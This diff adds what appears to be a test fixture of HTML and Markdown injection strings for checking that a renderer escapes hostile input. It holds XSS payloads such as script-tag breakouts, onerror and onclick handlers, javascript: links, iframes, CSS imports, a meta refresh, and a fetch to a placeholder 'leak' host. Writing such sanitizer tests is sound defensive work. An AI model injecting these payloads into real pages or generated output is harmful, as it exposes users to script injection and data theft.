@@ -1,0 +1,15 @@
+</title><script>alert("title")</script>
+<img src=x onerror=alert(1)>
+</button><script>alert("option")</script>
+window.claude.use("artifact")
+@@BODY@@
+@@THEME@@
+<a href="javascript:alert(2)">only once</a>
+</h2><iframe src="https://example.invalid/frame"></iframe>
+[a link](javascript:alert(3))
+<style>@import url(https://example.invalid/x.css);</style>
+</code><script>fetch("https://example.invalid/leak")</script>
+"quoted" 'single' & ampersands; <link rel="stylesheet" href="//example.invalid/s.css">
+onclick="alert(4)"
+</pre></script><script>alert("fence")</script>
+<meta http-equiv="refresh" content="0;url=https://example.invalid/">
